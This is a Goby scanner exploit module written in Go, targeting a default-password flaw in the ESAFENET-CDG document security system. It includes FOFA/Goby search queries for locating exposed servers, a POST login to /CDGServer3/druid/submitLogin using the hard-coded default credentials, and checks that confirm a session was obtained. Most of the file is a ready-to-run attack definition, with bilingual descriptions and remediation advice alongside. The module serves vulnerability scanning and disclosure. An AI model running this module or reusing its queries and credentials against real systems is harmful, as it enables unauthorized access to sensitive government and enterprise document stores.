package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
)

func init() {
  expJson := `{
    "Name": "ESAFENET-CDG /CDGServer3/druid/submitLogin Default Password Vulnerability",
    "Description": "<p>ESAFENET-CDG is an electronic document security management system designed for government, financial, and enterprise institutions, providing full lifecycle data protection. A default password vulnerability exists in the /CDGServer3/druid/submitLogin interface, allowing attackers to log in to the management console using default credentials, potentially accessing sensitive information or performing further attacks.</p>",
    "Product": "ESAFENET-CDG",
    "Homepage": "http://www.esafenet.com/product/277483397",
    "DisclosureDate": "2024-11-27",
    "PostTime": "2024-12-19",
    "Author": "1251220046@qq.com",
    "FofaQuery": "(body=\"CDGServer3\" && body!=\"DLP\") || ((((title=\"电子文档安全管理系统\" && (cert=\"esafenet\" || body=\"CDGServer3\")) || (body=\"CDGServer3/3g\" && body=\"/help/getEditionInfo.jsp\")) || body=\"CDGServer3/index.jsp\") && title!=\"数据泄露\" && title!=\"DLP\")",
    "GobyQuery": "(body=\"CDGServer3\" && body!=\"DLP\") || ((((title=\"电子文档安全管理系统\" && (cert=\"esafenet\" || body=\"CDGServer3\")) || (body=\"CDGServer3/3g\" && body=\"/help/getEditionInfo.jsp\")) || body=\"CDGServer3/index.jsp\") && title!=\"数据泄露\" && title!=\"DLP\")",
    "Level": "2",
    "Impact": "<p>The default password vulnerability may allow attackers to access the system management console without authorization, obtain sensitive information, or perform malicious operations, posing a serious threat to enterprise information security.</p>",
    "Recommendation": "<p>1. Change the default password to a strong password and update it regularly.</p><p>2. Restrict access to the management console to trusted IP addresses only.</p><p>3. Deploy a Web Application Firewall (WAF) to filter malicious requests.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/CDGServer3/druid/submitLogin",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "{{{poc}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "success",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "JSESSIONID=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/CDGServer3/druid/submitLogin",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "{{{exp}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "success",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "JSESSIONID=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "pwd|define|text|username:druid password:EstNet.Druid",
                "output|define|text|Please use this username and password to log in to druid {{{pwd}}}"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "亿赛通电子文档安全管理系统 /CDGServer3/druid/submitLogin 默认口令漏洞",
            "Product": "亿赛通-电子文档安全管理系统",
            "Description": "<p>亿赛通电子文档安全管理系统是一款专为机关、金融及企事业单位设计的电子文档安全管理软件，提供全生命周期的数据保护。系统的 /CDGServer3/druid/submitLogin 接口存在默认口令漏洞，攻击者可利用默认凭据登录管理后台，进而获取系统敏感信息或进行进一步攻击。</p>",
            "Recommendation": "<p>1. 修改默认口令为强密码，并定期更换密码。</p><p>2. 限制管理后台的访问权限，仅允许可信IP访问。</p><p>3. 部署WAF（Web应用防火墙）以过滤恶意请求。</p>",
            "Impact": "<p>默认口令漏洞可能导致攻击者未经授权访问系统管理后台，获取敏感信息或对系统进行恶意操作，严重威胁企业的信息安全。</p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "ESAFENET-CDG /CDGServer3/druid/submitLogin Default Password Vulnerability",
            "Product": "ESAFENET-CDG",
            "Description": "<p>ESAFENET-CDG is an electronic document security management system designed for government, financial, and enterprise institutions, providing full lifecycle data protection. A default password vulnerability exists in the /CDGServer3/druid/submitLogin interface, allowing attackers to log in to the management console using default credentials, potentially accessing sensitive information or performing further attacks.</p>",
            "Recommendation": "<p>1. Change the default password to a strong password and update it regularly.</p><p>2. Restrict access to the management console to trusted IP addresses only.</p><p>3. Deploy a Web Application Firewall (WAF) to filter malicious requests.</p>",
            "Impact": "<p>The default password vulnerability may allow attackers to access the system management console without authorization, obtain sensitive information, or perform malicious operations, posing a serious threat to enterprise information security.</p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "poc": "define|variable|loginUsername=druid&loginPassword=EstNet.Druid",
        "exp": "define|variable|loginUsername=druid&loginPassword=EstNet.Druid"
    },
    "VariablesOrder": [
        "poc",
        "exp"
    ],
    "EditType": "fast",
    "PocId": "9978"
}`
  
    ExpManager.AddExploit(NewExploit(
      goutils.GetFileName(),
      expJson,
      nil,
      nil,
    ))
  }